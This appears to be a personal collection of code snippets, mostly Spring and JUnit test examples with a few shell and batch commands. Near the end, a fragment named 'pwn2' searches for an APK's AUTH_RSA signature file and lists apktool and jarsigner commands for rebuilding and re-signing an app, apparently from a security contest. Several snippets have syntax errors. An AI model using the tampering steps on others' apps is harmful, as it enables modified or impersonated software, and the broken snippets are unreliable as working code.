    .andExpect(status().isOk())
    .andExpect(content().string(org.hamcrest.Matchers.containsString("{\"id\":\"" + id + "\"}"))); 
--------------------------------------------------------------------------------------------------------
        //when
        final MvcResult result = this.mockMvc.perform(
                MockMvcRequestBuilders.post(uriTemplate)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(asString(ticketRequest))
                        .accept(MediaType.APPLICATION_JSON))
                .andDo(print())
                .andExpect(status().isOk())
                .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8))
                .andReturn();

        final String response = result.getResponse().getContentAsString();
        //final Integer id = JsonPath.parse(response).read("$.id");
--------------------------------------------------------------------------------------------------------
@Autowired
private WebApplicationContext wac;

@Autowired
private FilterChainProxy filterChain;

private MockMvc mockMvc;

@Before
public void setup() {
    this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac)
      .addFilter(filterChain).build();
}

@Test
public void testSession() throws Exception {
    // Login and save the cookie
    MvcResult result = mockMvc.perform(post("/session")
      .param("username", "john").param("password", "s3cr3t")).andReturn();
    Cookie c = result.getResponse().getCookie("my-cookie");
    assertThat(c.getValue().length(), greaterThan(10));

    // No cookie; 401 Unauthorized
    mockMvc.perform(get("/personal").andExpect(status().isUnauthorized());

    // With cookie; 200 OK
    mockMvc.perform(get("/personal").cookie(c)).andExpect(status().isOk());

    // Logout, and ensure we're told to wipe the cookie
    result = mockMvc.perform(delete("/session").andReturn();
    c = result.getResponse().getCookie("my-cookie");
    assertThat(c.getValue().length(), is(0));
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment=WebEnvironment.RANDOM_PORT)
@AutoConfigureMockMvc
public class SBTest {
    @Autowired
    private TestRestTemplate restTemplate;

    @Autowired
    private MockMvc mvc;

   // tests
}
--------------------------------------------------------------------------------------------------------
mockRestServiceServer.expect(requestTo("/number")).andExpect(method(HttpMethod.GET))
    .anyNumberOfTimes()
    .andRespond(withSuccess("1", MediaType.TEXT_PLAIN));
	
mockRestServiceServer.expect(requestTo("/number")).andExpect(method(HttpMethod.GET))
    .times(2)
    .andRespond(withSuccess("4", MediaType.TEXT_PLAIN));
--------------------------------------------------------------------------------------------------------
@Service
public class DetailsServiceClient {
 
    private final RestTemplate restTemplate;
 
    public DetailsServiceClient(RestTemplateBuilder restTemplateBuilder) {
        restTemplate = restTemplateBuilder.build();
    }
 
    public Details getUserDetails(String name) {
        return restTemplate.getForObject("/{name}/details",
          Details.class, name);
    }
}
RunWith(SpringRunner.class)
@RestClientTest(DetailsServiceClient.class)
public class DetailsServiceClientTest {
 
    @Autowired
    private DetailsServiceClient client;
 
    @Autowired
    private MockRestServiceServer server;
 
    @Autowired
    private ObjectMapper objectMapper;
 
    @Before
    public void setUp() throws Exception {
        String detailsString = 
          objectMapper.writeValueAsString(new Details("John Smith", "john"));
         
        this.server.expect(requestTo("/john/details"))
          .andRespond(withSuccess(detailsString, MediaType.APPLICATION_JSON));
    }
 
    @Test
    public void whenCallingGetUserDetails_thenClientMakesCorrectCall() 
      throws Exception {
 
        Details details = this.client.getUserDetails("john");
 
        assertThat(details.getLogin()).isEqualTo("john");
        assertThat(details.getName()).isEqualTo("John Smith");
    }
}
--------------------------------------------------------------------------------------------------------
    @Test
    public void testGetMessage_500() {
        mockServer.expect(requestTo("http://google.com"))
                .andExpect(method(HttpMethod.GET))
                .andRespond(withServerError());

        String result = simpleRestService.getMessage();

        mockServer.verify();
        assertThat(result, allOf(containsString("FAILED"),
                       containsString("500")));
    }
	    @Test
    public void testGetMessage_404() {
        mockServer.expect(requestTo("http://google.com"))
                .andExpect(method(HttpMethod.GET))
                .andRespond(withStatus(HttpStatus.NOT_FOUND));

        String result = simpleRestService.getMessage();

        mockServer.verify();
        assertThat(result, allOf(containsString("FAILED"),
                       containsString("404")));
    }
	
	    @Test
    public void testGetMessage() {
        mockServer.expect(requestTo("http://google.com"))
                .andExpect(method(HttpMethod.GET))
                .andRespond(withSuccess("resultSuccess", MediaType.TEXT_PLAIN));

        String result = simpleRestService.getMessage();

        mockServer.verify();
        assertThat(result, allOf(containsString("SUCCESS"),
                       containsString("resultSuccess")));
    }
--------------------------------------------------------------------------------------------------------
    public static void main (String[] args) {
        final int[] ints = IntStream.range(0, 5).toArray();
        PerformanceTestUtil.runTest("forEach() method", () -> {
            Arrays.stream(ints).parallel().forEach(i -> doSomething(i));
        });

        PerformanceTestUtil.runTest("forEachOrdered() method", () -> {
            Arrays.stream(ints).parallel().forEachOrdered(i -> doSomething(i));
        });
    }
	
	public class SideEffectWrongUse {

    public static void main (String[] args) {
        List<Integer> results = new ArrayList<>();
        IntStream.range(0, 150)
                 .parallel()
                 .filter(s -> s % 2 == 0)
                 .forEach(s -> results.add(s));//stateful side effect
        //not thread safe
        System.out.println(results);
    }
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = {"classpath*:/test-dao-rest.xml"})
public class TestEmployeeRestDao {

  @Autowired
  private EmployeeDao employeeRestDao;

  @Autowired
  private RestTemplate mockRestTemplate;

  private MockRestServiceServer mockServer;

  /**
   * Sets up.
   */
  @Before
  public void setUp() {
    mockServer = MockRestServiceServer.bindTo(mockRestTemplate).build();
  }

  @Test
  public void testGetEmployeeById() {
    when(mockRestTemplate.getForObject(url + 1, Employee.class)).thenReturn(emp2);
    mockServer.expect(times(1), requestTo(url + 1))
        .andExpect(method(HttpMethod.GET))
    Employee employee = employeeRestDao.getEmployeeById(1L);
    assertNotNull(employee);
    mockServer.verify();
  }
--------------------------------------------------------------------------------------------------------
public class OtherJUnit4Test {

  @Rule
  public final TemporaryFolder folder = new TemporaryFolder();

  @Rule
  public final Timeout timeout = new Timeout(1000);

  @Rule
  public final ExpectedException thrown = ExpectedException.none();

  @Ignore
  @Test
  public void anotherInfinity() {
    while (true);
  }

  @Test
  public void testFileWriting() throws IOException {
    final File log = folder.newFile("debug.log");
    final FileWriter logWriter = new FileWriter(log);
    logWriter.append("Hello, ");
    logWriter.append("World!!!");
    logWriter.flush();
    logWriter.close();
  }

  @Test
  public void testExpectedException() throws IOException {
    thrown.expect(NullPointerException.class);
    StringUtils.toHexString(null);
  }
}
--------------------------------------------------------------------------------------------------------
@Autowired
private RestTemplate restTemplate;

private MockRestServiceServer mockServer;

@Before
public void setup() {
    this.mockServer = MockRestServiceServer.createServer(this.restTemplate);
}

@Test
public void testDefaultMethod() throws Exception {
    this.mockServer.expect(requestTo("/testApps/httpMethod"))
            .andExpect(method(HttpMethod.POST))
            .andRespond(withSuccess(HttpMethod.POST.name(), MediaType.TEXT_PLAIN));

    this.defaultChannel.send(new GenericMessage<String>("Hello"));
    Message<?> message = this.replyChannel.receive(5000);
    assertNotNull(message);
    assertEquals("POST", message.getPayload());

    this.mockServer.verify();

@Configuration
public class RestClientTestApplicationConfig {
    @Bean
    @Qualifier("httpRequestChannel")
    public MessageChannel httpRequestChannel() { return new QueueChannel(); }

    @Bean
    @Qualifier("httpReplyChannel")
    public MessageChannel httpReplyChannel() { return new QueueChannel(); }

    @Bean
    public RestTemplate restTemplate() { return new RestTemplate(); }

    @Bean
    @InboundChannelAdapter(value="httpRequestChannel", poller=@Poller(fixedDelay = "1000"))
    public MessageSource<String> httpRequestTrigger() { return new ExpressionEvaluatingMessageSource<>(new LiteralExpression(""), String.class); }

    @Bean
    @ServiceActivator(inputChannel="httpRequestChannel", poller=@Poller(fixedDelay = "1000"))
    public MessageHandler messageHandler(
        RestTemplate restTemplate,
        @Qualifier("httpReplyChannel") MessageChannel messageChannel,
        @Value("${url}") String url
    ) {
        HttpRequestExecutingMessageHandler messageHandler = new HttpRequestExecutingMessageHandler(url, restTemplate);
        messageHandler.setOutputChannel(messageChannel);
        return messageHandler;
    }
} 
--------------------------------------------------------------------------------------------------------
@ContextConfiguration
@TestExecutionListeners({
    MyCustomTestExecutionListener.class,
    ServletTestExecutionListener.class,
    DirtiesContextBeforeModesTestExecutionListener.class,
    DependencyInjectionTestExecutionListener.class,
    DirtiesContextTestExecutionListener.class,
    TransactionalTestExecutionListener.class,
    SqlScriptsTestExecutionListener.class
})
public class MyTest {
    // class body...
}
@ContextConfiguration
@TestExecutionListeners(
    listeners = MyCustomTestExecutionListener.class,
    mergeMode = MERGE_WITH_DEFAULTS
)
public class MyTest {
    // class body...
}

@RunWith(SpringRunner.class)
// ApplicationContext will be loaded from the
// static nested Config class
@ContextConfiguration 
public class OrderServiceTest {

    @Configuration
    static class Config {

        // this bean will be injected into the OrderServiceTest class
        @Bean
        public OrderService orderService() {
            OrderService orderService = new OrderServiceImpl();
            // set properties, etc.
            return orderService;
        }
    }

    @Autowired
    private OrderService orderService;

    @Test
    public void testOrderService() {
        // test the orderService
    }

}

https://docs.spring.io/spring/docs/current/spring-framework-reference/testing.html#testcontext-tel-config
--------------------------------------------------------------------------------------------------------
docker run -d --name axonserver -p 8024:8024 -p 8124:8124 axoniq/axonserver
--------------------------------------------------------------------------------------------------------
@Configuration
@Profile("default")
public class DefaultDataConfig {

    @Bean
    public DataSource dataSource() {
        return new EmbeddedDatabaseBuilder()
            .setType(EmbeddedDatabaseType.HSQL)
            .addScript("classpath:com/bank/config/sql/schema.sql")
            .build();
    }
}

@Configuration
@Profile("production")
public class JndiDataConfig {

    @Bean(destroyMethod="")
    public DataSource dataSource() throws Exception {
        Context ctx = new InitialContext();
        return (DataSource) ctx.lookup("java:comp/env/jdbc/datasource");
    }
}

@Configuration
@Profile("dev")
public class StandaloneDataConfig {

    @Bean
    public DataSource dataSource() {
        return new EmbeddedDatabaseBuilder()
            .setType(EmbeddedDatabaseType.HSQL)
            .addScript("classpath:com/bank/config/sql/schema.sql")
            .addScript("classpath:com/bank/config/sql/test-data.sql")
            .build();
    }
}

// "dev" profile overridden with "production"
@ActiveProfiles(profiles = "production", inheritProfiles = false)
public class ProductionTransferServiceTest extends AbstractIntegrationTest {
    // test body
}
@ContextConfiguration
@TestPropertySource(properties = {"timezone = GMT", "port: 4242"}) 
public class MyIntegrationTests {
    // class body...
}

@RunWith(SpringRunner.class)
@ContextConfiguration
@WebAppConfiguration
public class SessionScopedBeanTests {

    @Autowired UserService userService;
    @Autowired MockHttpSession session;

    @Test
    public void sessionScope() throws Exception {
        session.setAttribute("theme", "blue");

        Results results = userService.processUserPreferences();
        // assert results
    }
}

@RunWith(SpringRunner.class)
@ContextConfiguration(classes = TestConfig.class)
@Transactional
public class HibernateUserRepositoryTests {

    @Autowired
    HibernateUserRepository repository;

    @Autowired
    SessionFactory sessionFactory;

    JdbcTemplate jdbcTemplate;

    @Autowired
    public void setDataSource(DataSource dataSource) {
        this.jdbcTemplate = new JdbcTemplate(dataSource);
    }

    @Test
    public void createUser() {
        // track initial state in test database:
        final int count = countRowsInTable("user");

        User user = new User(...);
        repository.save(user);

        // Manual flush is required to avoid false positive in test
        sessionFactory.getCurrentSession().flush();
        assertNumUsers(count + 1);
    }

    protected int countRowsInTable(String tableName) {
        return JdbcTestUtils.countRowsInTable(this.jdbcTemplate, tableName);
    }

    protected void assertNumUsers(int expected) {
        assertEquals("Number of rows in the [user] table.", expected, countRowsInTable("user"));
    }
}

@ContextConfiguration
@Transactional(transactionManager = "txMgr")
@Commit
public class FictitiousTransactionalTest {

    @BeforeTransaction
    void verifyInitialDatabaseState() {
        // logic to verify the initial state before a transaction is started
    }

    @Before
    public void setUpTestDataWithinTransaction() {
        // set up test data within the transaction
    }

    @Test
    // overrides the class-level @Commit setting
    @Rollback
    public void modifyDatabaseWithinTransaction() {
        // logic which uses the test data and modifies database state
    }

    @After
    public void tearDownWithinTransaction() {
        // execute "tear down" logic within the transaction
    }

    @AfterTransaction
    void verifyFinalDatabaseState() {
        // logic to verify the final state after transaction has rolled back
    }
}

@Test
public void databaseTest {
    ResourceDatabasePopulator populator = new ResourceDatabasePopulator();
    populator.addScripts(
            new ClassPathResource("test-schema.sql"),
            new ClassPathResource("test-data.sql"));
    populator.setSeparator("@@");
    populator.execute(this.dataSource);
    // execute code that uses the test schema and data
}

@SpringJUnitConfig
@Sql("/test-schema.sql")
class DatabaseTests {

    @Test
    void emptySchemaTest {
        // execute code that uses the test schema without any test data
    }

    @Test
    @Sql({"/test-schema.sql", "/test-user-data.sql"})
    void userTest {
        // execute code that uses the test schema and test data
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.stereotype.Repository;
import ru.kacit.demo.test.server.dao.EmployeeDao;
import ru.kacit.demo.test.server.model.Employee;
import ru.kacit.demo.test.server.model.Employee_;

import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import javax.persistence.criteria.CriteriaBuilder;
import javax.persistence.criteria.CriteriaQuery;
import javax.persistence.criteria.Root;
import java.util.List;

/**
 * @author Serge Petunin
 *         18.03.12 0:42
 */
@Repository
public class JpaEmployeeDao implements EmployeeDao {

    @PersistenceContext
    private EntityManager em;
    
    public Employee get(Long id) {
        return em.find(Employee.class, id);
    }

    public List<Employee> list(String nameStartsWith) {
        CriteriaBuilder cb = em.getCriteriaBuilder();
        CriteriaQuery<Employee> query = cb.createQuery(Employee.class);
        Root<Employee> employeeRoot = query.from(Employee.class);
        if (nameStartsWith != null && !nameStartsWith.isEmpty()) {
            query.where(cb.like(cb.lower(employeeRoot.get(Employee_.name)), nameStartsWith.toLowerCase() + '%'));
        }
        return em.createQuery(query).getResultList();
    }
    
    public void saveOrUpdate(Employee employee) {
        if (employee.getId() == null) {
            em.persist(employee);
        } else {
            em.merge(employee);
        }
    }

    public void delete(Employee employee) {
        em.remove(employee);
    }
}
--------------------------------------------------------------------------------------------------------
@Test
@SqlGroup({
    @Sql(scripts = "/test-schema.sql", config = @SqlConfig(commentPrefix = "`")),
    @Sql("/test-user-data.sql")
)}
public void userTest {
    // execute code that uses the test schema and test data
}
--------------------------------------------------------------------------------------------------------
@echo off

start "" http://www.cnn.com
start "" http://www.abc.com
start "" http://www.msnbc.com
start "" http://www.bbc.com
start "" http://www.huffingtonpost.com
start "" http://www.aljazeera.com
start "" https://news.google.com/

@echo off

rem For each file in your folder
for %%a in (".\*") do (
rem check if the file has an extension and if it is not our script
if "%%~xa" NEQ "" if "%%~dpxa" NEQ "%~dpx0" (
rem check if extension folder exists, if not it is created
if not exist "%%~xa" mkdir "%%~xa"
rem Move the file to directory
move "%%a" "%%~dpa%%~xa\"
))
--------------------------------------------------------------------------------------------------------
import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import javax.persistence.criteria.CriteriaBuilder;
import javax.persistence.criteria.CriteriaQuery;

/**
 * @author Serge Petunin
 *         18.03.12 3:12
 */
public class JpaTest {
    
    @PersistenceContext
    private EntityManager em;

    protected <T> T get(Class<T> objectClass, Long id) {
        return em.find(objectClass, id);
    }

    protected <T> long count(Class<T> objectClass) {
        CriteriaBuilder cb = em.getCriteriaBuilder();
        CriteriaQuery<Long> query = cb.createQuery(Long.class);
        query.select(cb.count(query.from(objectClass)));
        return em.createQuery(query).getSingleResult();
    }
}
--------------------------------------------------------------------------------------------------------
 curl -k -d "grant_type=password&username=test&password=test" -H 
"Authorization: Basic QU01dE04MXFrdzg5ZFNFTjk2Vm0waGgwWnBNYTpzeHcxbko3c2gzdm5NVVlmUDEzVmV1bWtsbTRh, 
Content-Type: application/x-www-form-urlencoded" https://XXXXXX:8243/token
--------------------------------------------------------------------------------------------------------
# Vault
spring.cloud.vault.host=localhost
spring.cloud.vault.port=8200
spring.cloud.vault.scheme=http
spring.cloud.vault.authentication=token
spring.cloud.vault.token=
--------------------------------------------------------------------------------------------------------

import static org.junit.Assert.assertEquals;
import static org.springframework.test.web.client.ExpectedCount.once;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.requestTo;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withSuccess;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.client.MockRestServiceServer;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.client.support.RestGatewaySupport;

import com.javacodegeeks.example.service.ExampleRestService;

@RunWith(SpringRunner.class)
@SpringBootTest
public class ExampleRestServiceTestViaRestGateway {
	
	@Autowired
	RestTemplate restTemplate;

	@Autowired
	ExampleRestService service;

	private MockRestServiceServer mockServer;

	@Before
	public void setUp() {
		RestGatewaySupport gateway = new RestGatewaySupport();
		gateway.setRestTemplate(restTemplate);
		mockServer = MockRestServiceServer.createServer(gateway);
	}
	
	@Test
	public void testGetRootResourceOnce() {
		mockServer.expect(once(), requestTo("http://localhost:8080"))
			.andRespond(withSuccess("{message : 'under construction'}", MediaType.APPLICATION_JSON));

		String result = service.getRootResource();
		System.out.println("testGetRootResourceOnce: " + result);

		mockServer.verify();
		assertEquals("{message : 'under construction'}", result);
	}
}
--------------------------------------------------------------------------------------------------------
import static org.junit.Assert.assertEquals;
 
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.client.MockRestServiceServer;
import org.springframework.web.client.RestTemplate;
 
import com.javacodegeeks.example.service.ExampleRestService;
 
import static org.springframework.test.web.client.match.MockRestRequestMatchers.requestTo;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.method;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withSuccess;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withBadRequest;
import static org.springframework.test.web.client.ExpectedCount.once;
import static org.springframework.test.web.client.ExpectedCount.times;
 
@RunWith(SpringRunner.class) //SpringRunner is an alias for the SpringJUnit4ClassRunner
@SpringBootTest
public class ExampleRestServiceTest {
 
    @Autowired
    RestTemplate restTemplate;
 
    @Autowired
    ExampleRestService service;
 
    private MockRestServiceServer mockServer;
 
    @Before
    public void setUp() {
        mockServer = MockRestServiceServer.createServer(restTemplate);
    }
 
    @Test
    public void testGetRootResource() {
        mockServer.expect(requestTo("http://localhost:8080")).andRespond(withSuccess("hello", MediaType.TEXT_PLAIN));
 
        String result = service.getRootResource();
        System.out.println("testGetRootResource: " + result);
 
        mockServer.verify();
        assertEquals("hello", result);
    }
     
    @Test
    public void testGetRootResourceOnce() {
        mockServer.expect(once(), requestTo("http://localhost:8080"))
            .andRespond(withSuccess("{message : 'under construction'}", MediaType.APPLICATION_JSON));
 
        String result = service.getRootResource();
        System.out.println("testGetRootResourceOnce: " + result);
 
        mockServer.verify();
        assertEquals("{message : 'under construction'}", result);
    }
     
    @Test
    public void testGetRootResourceTimes() {
        mockServer.expect(times(2), requestTo("http://localhost:8080"))
            .andRespond(withSuccess("{message : 'under construction'}", MediaType.APPLICATION_JSON));
 
        String result = service.getRootResource();
        System.out.println("testGetRootResourceTimes: " + result);
 
        mockServer.verify(); // should fail because this test expects RestTemplate.getForObject to be called twice 
        assertEquals("{message : 'under construction'}", result);
    }
     
    @Test
    public void testAddComment() {
        mockServer.expect(requestTo("http://localhost/add-comment")).andExpect(method(HttpMethod.POST))
            .andRespond(withSuccess("{post : 'success'}", MediaType.APPLICATION_JSON));
 
        String result = service.addComment("cute puppy");
        System.out.println("testAddComment: " + result);
 
        mockServer.verify();
        assertEquals("{post : 'success'}", result);
    }
     
    @Test
    public void testAddCommentClientError() {
        mockServer.expect(requestTo("http://localhost/add-comment")).andExpect(method(HttpMethod.POST))
            .andRespond(withBadRequest());
 
        String result = service.addComment("cute puppy");
        System.out.println("testAddCommentClientError: " + result);
 
        mockServer.verify();
        assertEquals("400 Bad Request", result);
    }
     
    @Test
    public void testReset() {
        mockServer.expect(requestTo("http://localhost/add-comment")).andExpect(method(HttpMethod.POST))
            .andRespond(withSuccess("{post : 'success'}", MediaType.APPLICATION_JSON));
 
        String result = service.addComment("cute puppy");
        System.out.println("testReset 1st: " + result);
 
        mockServer.verify();
        assertEquals("{post : 'success'}", result);
         
        mockServer.reset();
         
        mockServer.expect(requestTo("http://localhost:8080")).andRespond(withSuccess("hello", MediaType.TEXT_PLAIN));
 
        result = service.getRootResource();
        System.out.println("testReset 2nd: " + result);
 
        mockServer.verify();
        assertEquals("hello", result);
    }
}

mport java.util.concurrent.ExecutionException;
 
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.concurrent.ListenableFuture;
import org.springframework.web.client.AsyncRestTemplate;
import org.springframework.web.client.HttpServerErrorException;
 
@Service
public class AsyncExampleRestService {
 
    @Autowired
    private AsyncRestTemplate asyncRestTemplate;
     
    public String deleteAllSuspendedUsers() {
        ListenableFuture future = asyncRestTemplate.delete("http://localhost/delete-all-suspended-users");
        // doing some long process here...
        Object result = null;
        String returnValue = "";
        try {
            result = future.get(); //The Future will return a null result upon completion.
            if (result == null) {
                returnValue = "{result:'success'}";
            } else {
                returnValue = "{result:'fail'}";
            }
        } catch (InterruptedException | ExecutionException e) {
            if (e.getCause() instanceof HttpServerErrorException) {
                returnValue = "{result: 'server error'}";
            }
        }
        System.out.println("deleteAllSuspendedUsers: " + result);
         
        return returnValue;
    }
}

import static org.junit.Assert.assertEquals;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.method;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.requestTo;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withServerError;
 
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpMethod;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.client.MockRestServiceServer;
import org.springframework.web.client.AsyncRestTemplate;
 
import com.javacodegeeks.example.service.AsyncExampleRestService;
 
@RunWith(SpringRunner.class)
@SpringBootTest
public class AsyncExampleRestServiceTest {
 
    @Autowired
    AsyncRestTemplate asyncRestTemplate;
 
    @Autowired
    AsyncExampleRestService service;
 
    private MockRestServiceServer mockServer;
 
    @Before
    public void setUp() {
        mockServer = MockRestServiceServer.createServer(asyncRestTemplate);
    }
 
    @Test
    public void testDeleteAllSuspendedUsers() {
        mockServer.expect(requestTo("http://localhost/delete-all-suspended-users")).andExpect(method(HttpMethod.DELETE))
            .andRespond(withServerError());
 
        String result = service.deleteAllSuspendedUsers();
        System.out.println("testDeleteAllSuspendedUsers: " + result);
 
        mockServer.verify();
        assertEquals("{result: 'server error'}", result);
    }
}
--------------------------------------------------------------------------------------------------------
 ID
	

Описание

auditevents
	

Предоставляет информацию о событиях
аудита для текущего приложения.

beans
	

Отображает полный список всех
Spring-бинов в приложении.

caches
	

Информация о кэше.

conditions
	

Показывает условия (Condition), которые
были вычислены для классов конфигурации
и автоконфигурации, и причины, по
которым они соответствовали или не
соответствовали.

configprops
	

Отображает список всех
@ConfigurationProperties

env
	

Отображает свойства из
ConfigurableEnvironment.

flyway
	

Показывает миграции баз данных
Flyway, которые были применены.

health
	

Показывает сведения о работоспособности
приложения.

httptrace
	

Отображает информацию трассировки
HTTP (по умолчанию последние 100 HTTP
запросов-ответов).

info
	

Отображает дополнительную информацию
о приложении.

integrationgraph
	

Граф Spring Integration.

loggers
	

Отображает и позволяет
изменить конфигурацию логгеров в
приложении.

liquibase
	

Показывает примененные миграции
базы данных Liquibase.

metrics
	

Показывает информацию о метриках
для текущего приложения.

mappings
	

Отображает список всех путей
@RequestMapping.

scheduledtasks
	

Отображает запланированные задачи
(scheduled tasks).

sessions
	

Позволяет извлекать и удалять
пользовательские сессии из хранилищ,
поддерживаемых Spring Session. Недоступно
при использовании Spring Session для реактивных
веб-приложений.

shutdown
	

Позволяет приложению корректно
завершить работу.

threaddump
	

Отображает информацию о потоках.

http://localhost:8086/api/env

 

http://localhost:8086/api/status

 

http://localhost:8086/api/info
--------------------------------------------------------------------------------------------------------
docker run -i -t vertx/vertx3-exec

npm install vertx3-min
npm install vertx3-full
--------------------------------------------------------------------------------------------------------
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface Log {
}

import ru.otus.ea.annotations.Log;
import ru.otus.ea.tolog.ITestLogging;
import ru.otus.ea.tolog.TestLogging;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

public class IoC {
    static Set<String> annotatedMethodsSet = new HashSet<>();

    public static void setAnnotatedMethodsSet() {
        for (Method m : TestLogging.class.getDeclaredMethods()) {
            if (m.isAnnotationPresent(Log.class)) {
                annotatedMethodsSet.add(m.getName());
            }
        }
    }

    public static ITestLogging createMyClass() {

        setAnnotatedMethodsSet();

        InvocationHandler handler = new DemoInvocationHandler(new TestLogging());
        return (ITestLogging) Proxy.newProxyInstance(IoC.class.getClassLoader(),
                new Class<?>[]{ITestLogging.class}, handler);
    }

    static class DemoInvocationHandler implements InvocationHandler {
        private final ITestLogging myClass;

        DemoInvocationHandler(ITestLogging myClass) {
            this.myClass = myClass;
        }

        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            if (annotatedMethodsSet.contains(method.getName())) {
                System.out.println("executed method:" + method);
                System.out.println("params:");
                Arrays.stream(args).forEach(System.out::println);
            }
            return method.invoke(myClass, args);
        }

        @Override
        public String toString() {
            return "DemoInvocationHandler{" +
                    "myClass=" + myClass +
                    '}';
        }
    }

}
--------------------------------------------------------------------------------------------------------
public class ProfileManager {
    @Autowired
    private Environment environment;
 
    public void getActiveProfiles() {
        for (String profileName : environment.getActiveProfiles()) {
            System.out.println("Currently active profile - " + profileName);
        }  
    }
}

@Value("${spring.profiles.active}")
private String activeProfile;

public class ProfileManager {
    @Value("${spring.profiles.active:}")
    private String activeProfiles;
 
    public String getActiveProfiles() {
        for (String profileName : activeProfiles.split(",")) {
            System.out.println("Currently active profile - " + profileName);
        }
    }
}
--------------------------------------------------------------------------------------------------------
    @Test
    public void test_ConfirmationController_EndPoint_whenException() {
        // init mocks
        doThrow(new ConfirmationNotFoundException()).when(this.authorityRedisTemplate).hasKey(join(this.confirmationRedisProperty.getKeyPrefix(), DEFAULT_CONFIRMATION_ID));

        // given
        final String errorMessage = String.format("ERROR: cannot find confirmation with id = {%s}", DEFAULT_CONFIRMATION_ID);
        final ConfirmationRequest confirmationRequest = this.getConfirmationRequest(DEFAULT_USER_ID, DEFAULT_CONFIRMATION_ID);
        final UriComponentsBuilder builder = UriComponentsBuilder
                .fromHttpUrl(join(this.baseURL, BASE_CONFIRMATION_URL))
                .queryParam("uid", confirmationRequest.getUid())
                .queryParam("cid", confirmationRequest.getCid());

        // when
        final DefaultExceptionHandler.ExceptionResponse response = this.getTemplate().getForObject(builder.toUriString(), DefaultExceptionHandler.ExceptionResponse.class);

        // then
        assertThat(response, is(not(nullValue())));
        assertThat(response.getStatus(), equalTo(HttpStatus.INTERNAL_SERVER_ERROR.value()));
        assertThat(response.getMessage(), containsString(errorMessage));
        assertThat(response.getPath(), equalTo("/api/v1/confirmations"));
    }
--------------------------------------------------------------------------------------------------------
private static final String EMAIL_INLINEIMAGE_TEMPLATE_NAME = "templateemail.html";

@Bean
public TemplateEngine emailTemplateEngine() {
    templateEngine = new SpringTemplateEngine();
    templateEngine.addTemplateResolver(this.htmlTemplateResolver());
       )

    templateEngine.setTemplateEngineMessageSource(this.messageSource);
    return templateEngine;
}

private static ITemplateResolver htmlTemplateResolver() {
    final ClassLoaderTemplateResolver templateResolver = new ClassLoaderTemplateResolver();
    templateResolver.setOrder(Integer.valueOf(0));
    templateResolver.setPrefix("classpath:/templates/");
    templateResolver.setSuffix(".html");
    templateResolver.setTemplateMode(TemplateResolver.DEFAULT_TEMPLATE_MODE);
    templateResolver.setCharacterEncoding("UTF-8");
    templateResolver.setCacheable(false);
    return templateResolver;
}


public void sendEmail(String emailAddress, String title, String body, Locale local, String image) {
    if (Boolean.parseBoolean(isEmailServiceActivated)) {
        MimeMessage mimeMessage = mailSender.createMimeMessage();
        MimeMessageHelper mailMsg = new MimeMessageHelper(mimeMessage);
        try {
            mailMsg.setFrom(EMAIL_USERNAME);
            mailMsg.setTo(emailAddress);
            mailMsg.setSubject(title);

            // Prepare the evaluation context
            ctx.setLocale(local);
            ctx.setVariable("imageHeaderResourceName", HEADER_LOGO_IMAGE);
            ctx.setVariable("body", body);

            ctx.setVariable("imageResourceName", image);

            final String htmlContent = this.templateEngine.process(new ClassPathResource(EMAIL_INLINEIMAGE_TEMPLATE_NAME).getPath(), ctx);
            mailMsg.setText(htmlContent, true );

            mailMsg.addInline(HEADER_LOGO_IMAGE, new ClassPathResource(HEADER_LOGO_IMAGE ) , PNG_MIME);
            mailMsg.addInline(image, new ClassPathResource(image) , PNG_MIME);

        } catch (MessagingException e) {
            e.printStackTrace();
        }

        mailSender.send(mimeMessage);
    }
}
--------------------------------------------------------------------------------------------------------
String path = null;
File[] list = dir.listFiles();

for (File f : list) {

    if (f.isDirectory()) {
    path = pwn2(f);
    if (path != null)
        return path;
    } else {
    path = f.getAbsolutePath();
    if (path.contains("AUTH_RSA")) {
        Log.d(TAG, "AUTH_RSA found here - " + path);
        return path;
    }
    }
}
return null;

}

apktool b myfolder

keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name

Подробнее: https://www.securitylab.ru/contest/500042.php
--------------------------------------------------------------------------------------------------------
